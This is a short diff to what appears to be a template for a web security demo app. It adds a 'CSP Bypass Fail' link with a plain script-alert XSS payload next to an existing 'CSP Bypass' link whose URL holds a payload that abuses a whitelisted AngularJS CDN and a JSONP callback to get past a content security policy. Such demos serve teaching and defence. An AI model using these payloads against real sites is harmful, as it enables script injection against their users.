@@ -16,6 +16,10 @@
       </li>
 
       <li>
+        <a href="<%= `/demos/insufficient-csp-protection?name=<script>alert(1)</script>`%>">CSP Bypass Fail</a>
+      </li>
+
+      <li>
         <a href="<%= `/demos/insufficient-csp-protection?name=<script%20src="https://ajax.googleapis.com/ajax/libs/angularjs/1.1.3/angular.min.js"></script>%0A%0A<div%20ng-app%20ng-csp%20id=p%20ng-click=$event.view.alert(%27Hacked!%27)>%0A%0A<script%20async%20src=https://ajax.googleapis.com/jsapi?callback=p.click></script></div>`%>">CSP Bypass</a>
       </li>
 
